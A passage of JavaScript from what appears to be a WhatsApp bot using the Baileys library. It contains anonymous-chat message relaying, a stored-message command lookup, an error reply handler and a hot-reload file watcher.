						if (/^.*(next|leave|start)/.test(m.text)) return
						if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
						let other = [room.a, room.b].find(user => user !== m.sender)
						m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
							contextInfo: {
								...m.msg.contextInfo,
								forwardingScore: 0,
								isForwarded: true,
								participant: other
							}
						} : {})
					}
					return !0
				}
			
		if (isCmd && budy.toLowerCase() != undefined) {
			if (m.chat.endsWith('broadcast')) return
			if (m.isBaileys) return
			let msgs = global.db.data.database
			if (!(budy.toLowerCase() in msgs)) return
			alfa.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
		}
		

	} catch (err) {
		m.reply(util.format(err))
	}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
